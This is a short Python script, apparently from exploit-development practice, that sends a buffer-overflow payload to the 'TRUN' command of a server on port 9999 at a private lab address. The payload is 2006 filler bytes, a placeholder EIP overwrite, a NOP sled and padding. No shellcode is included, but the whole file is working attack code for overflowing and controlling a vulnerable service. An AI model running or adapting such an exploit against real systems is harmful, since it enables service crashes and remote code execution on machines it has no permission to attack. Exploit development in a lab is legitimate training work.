import socket

target = '192.168.192.133'
port = 9999

prefix = 'A' * 2006
eip = '\xef\xbe\xad\xde'
nops = '\x90' * 32
padding = 'B' * (3000 - 2006 - 4 - 32)
attack = prefix + eip + nops + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((target,port))
print s.recv(1024)
print " [+] sending attack on TRUN . with length ", len(attack)
s.send(('TRUN .' + attack + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()

